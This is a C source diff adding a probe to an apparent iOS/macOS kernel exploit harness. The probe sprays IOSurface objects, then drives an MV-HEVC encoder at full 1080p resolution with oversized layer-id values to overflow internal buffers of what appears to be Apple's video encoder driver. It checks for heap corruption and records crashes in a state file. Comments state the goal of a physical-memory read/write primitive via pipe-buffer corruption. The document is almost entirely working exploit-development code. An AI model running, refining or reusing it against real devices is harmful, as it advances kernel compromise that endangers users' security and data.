@@ -14278,6 +14278,177 @@ static void r339_probe(void) {
     fflush(stdout);
 }
 
+/* r346: Full-resolution AVE overflow + IOSurface corruption + phys R/W prep
+ * CRITICAL FIX: Earlier probes used 64x64 resolution — AVE internal buffers
+ * are too small to overflow. Original panics used 1920x1080 resolution.
+ * The VPS/internal table sizes scale with resolution and layer complexity.
+ *
+ * Part A: 1920x1080 lid=3 with IOSurface spray, incrementally to 300 encodes.
+ *         Check IOSurface corruption after every 10 encodes.
+ *         This should reproduce the original panic conditions.
+ * Part B: Try high lid values (0x10, 0x41, 0x100) with fewer encodes.
+ *         Higher lids = larger VPS layer extension = faster overflow.
+ * Part C: If overflow detected, test pipe buffer spray for phys R/W primitive.
+ *         Goal: corrupt a pipe buffer's backing store pointer to map phys memory. */
+
+static void r346_probe(void) {
+    rlog("\n=== r346: Full-Res AVE Overflow + IOSurface Corruption ===\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) return;
+
+    /* Spray IOSurface objects */
+    #define R346_SURF_COUNT 300
+    IOSurfaceRef surfs346[R346_SURF_COUNT];
+    uint32_t seeds346[R346_SURF_COUNT];
+    memset(surfs346, 0, sizeof(surfs346));
+
+    CFMutableDictionaryRef sd6 = CFDictionaryCreateMutable(NULL, 4,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef n6w = CFNumberCreate(NULL, kCFNumberIntType, &(int){64});
+    CFNumberRef n6h = CFNumberCreate(NULL, kCFNumberIntType, &(int){64});
+    CFNumberRef n6b = CFNumberCreate(NULL, kCFNumberIntType, &(int){4});
+    CFNumberRef n6f = CFNumberCreate(NULL, kCFNumberIntType, &(int){0x42475241});
+    CFDictionarySetValue(sd6, CFSTR("IOSurfaceWidth"), n6w);
+    CFDictionarySetValue(sd6, CFSTR("IOSurfaceHeight"), n6h);
+    CFDictionarySetValue(sd6, CFSTR("IOSurfaceBytesPerElement"), n6b);
+    CFDictionarySetValue(sd6, CFSTR("IOSurfacePixelFormat"), n6f);
+    int sprayed6 = 0;
+    for (int si = 0; si < R346_SURF_COUNT; si++) {
+        surfs346[si] = IOSurfaceCreate(sd6);
+        if (surfs346[si]) {
+            seeds346[si] = IOSurfaceGetSeed(surfs346[si]);
+            sprayed6++;
+        }
+    }
+    CFRelease(n6w); CFRelease(n6h); CFRelease(n6b); CFRelease(n6f); CFRelease(sd6);
+    rlog("  Sprayed %d IOSurface objects.\n", sprayed6);
+    fflush(stdout);
+
+    /* State file */
+    #define R346_MAGIC 0xDEAD0346
+    struct r346_state { uint32_t magic; uint32_t part; uint32_t lid; uint32_t last_enc; uint32_t crashed; };
+    char sp346[512];
+    snprintf(sp346, sizeof(sp346), "%s/Documents/r346_state.bin",
+             getenv("HOME") ? getenv("HOME") : "/tmp");
+    struct r346_state s346 = {0, 0, 0, 0, 0};
+    int rfd6 = open(sp346, O_RDONLY);
+    if (rfd6 >= 0) { read(rfd6, &s346, sizeof(s346)); close(rfd6); }
+
+    if (s346.magic == R346_MAGIC && s346.crashed) {
+        rlog("  PREV CRASH at part=%u lid=%u enc=%u — overflow confirmed!\n",
+             s346.part, s346.lid, s346.last_enc);
+        rlog("  This is where MTE caught the corruption.\n");
+        fflush(stdout);
+    }
+
+    /* ---- Part A: 1920x1080 lid=3 continuous encode ---- */
+    rlog("\n--- Part A: 1920x1080, lid=3, single encoder, 300 frames ---\n");
+    fflush(stdout);
+
+    VTCompressionSessionRef enc6a = create_mvhevc_encoder(1920, 1080, 3);
+    if (!enc6a) {
+        rlog("  FATAL: 1920x1080 lid=3 encoder create failed!\n");
+    } else {
+        int ok6 = 0, err6 = 0;
+        for (int fi = 0; fi < 300; fi++) {
+            /* Save state before encode */
+            s346.magic = R346_MAGIC; s346.part = 1; s346.lid = 3;
+            s346.last_enc = fi; s346.crashed = 1;
+            int wf = open(sp346, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s346, sizeof(s346)); close(wf); }
+
+            int r = encode_one_stereo_lid(enc6a, fi, 1920, 1080, 3);
+            if (r == 0) ok6++;
+            else err6++;
+
+            /* Mark survived */
+            s346.crashed = 0;
+            wf = open(sp346, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s346, sizeof(s346)); close(wf); }
+
+            /* Check every 10 frames or after frame 200 */
+            if ((fi % 10) == 9 || fi >= 200) {
+                int ch = 0;
+                for (int si = 0; si < R346_SURF_COUNT; si++) {
+                    if (!surfs346[si]) continue;
+                    uint32_t sn = IOSurfaceGetSeed(surfs346[si]);
+                    size_t wn = IOSurfaceGetWidth(surfs346[si]);
+                    size_t hn = IOSurfaceGetHeight(surfs346[si]);
+                    if (sn != seeds346[si] || wn != 64 || hn != 64) {
+                        if (ch < 3)
+                            rlog("    CHANGE surf[%d] seed=%u→%u w=%zu h=%zu @frame=%d\n",
+                                 si, seeds346[si], sn, wn, hn, fi);
+                        ch++;
+                    }
+                }
+                rlog("  [1080p lid=3 f=%d] ok=%d err=%d chg=%d\n", fi, ok6, err6, ch);
+                fflush(stdout);
+            }
+        }
+        VTCompressionSessionInvalidate(enc6a);
+        CFRelease(enc6a);
+        rlog("  Part A complete: 300 frames, ok=%d err=%d\n", ok6, err6);
+    }
+    fflush(stdout);
+
+    /* ---- Part B: High lid values with fewer encodes ---- */
+    rlog("\n--- Part B: High lid values, 1920x1080, 100 encodes each ---\n");
+    fflush(stdout);
+
+    int test_lids6[] = {10, 20, 50, 100, 0x100, 0x1000, 0x4141};
+    int nlids6 = sizeof(test_lids6) / sizeof(test_lids6[0]);
+
+    for (int ti = 0; ti < nlids6; ti++) {
+        int lid = test_lids6[ti];
+        rlog("  lid=0x%x: ", lid);
+        fflush(stdout);
+
+        VTCompressionSessionRef enc6b = create_mvhevc_encoder(1920, 1080, lid);
+        if (!enc6b) {
+            rlog("FAILED to create\n");
+            continue;
+        }
+
+        int ok = 0, err = 0;
+        for (int fi = 0; fi < 100; fi++) {
+            s346.magic = R346_MAGIC; s346.part = 2; s346.lid = lid;
+            s346.last_enc = fi; s346.crashed = 1;
+            int wf = open(sp346, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s346, sizeof(s346)); close(wf); }
+
+            int r = encode_one_stereo_lid(enc6b, fi, 1920, 1080, lid);
+            if (r == 0) ok++;
+            else { err++; if (fi < 3 && err >= 2) break; }
+
+            s346.crashed = 0;
+            wf = open(sp346, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (wf >= 0) { write(wf, &s346, sizeof(s346)); close(wf); }
+        }
+
+        VTCompressionSessionInvalidate(enc6b);
+        CFRelease(enc6b);
+
+        /* Quick IOSurface check */
+        int ch = 0;
+        for (int si = 0; si < R346_SURF_COUNT; si++) {
+            if (!surfs346[si]) continue;
+            uint32_t sn = IOSurfaceGetSeed(surfs346[si]);
+            if (sn != seeds346[si]) ch++;
+        }
+        rlog("ok=%d err=%d chg=%d\n", ok, err, ch);
+        fflush(stdout);
+    }
+
+    /* Cleanup */
+    for (int si = 0; si < R346_SURF_COUNT; si++) {
+        if (surfs346[si]) CFRelease(surfs346[si]);
+    }
+
+    rlog("\n=== r346 complete ===\n");
+    fflush(stdout);
+}
+
 /* r345: Persistent encoder crash threshold + speculative MTE probe
  * CRITICAL FIX: Earlier panics used ONE encoder with continuous VPS growth.
  * r344 created a NEW encoder per count — wrong heap layout, no crashes.
@@ -47933,6 +48104,15 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 349) {
+            rlog("*** rounds=349: Full-Res 1920x1080 AVE Overflow ***\n");
+            rlog("  KEY INSIGHT: Earlier panics used 1920x1080, our probes used 64x64.\n");
+            rlog("  VPS/internal table sizes scale with resolution — 64x64 never overflows.\n");
+            rlog("  Part A: 1920x1080 lid=3, 300 encodes, IOSurface corruption check.\n");
+            rlog("  Part B: High lid values (10..0x4141) with 100 encodes each.\n\n");
+            r346_probe();
             goto done;
         }
         if (rounds == 348) {
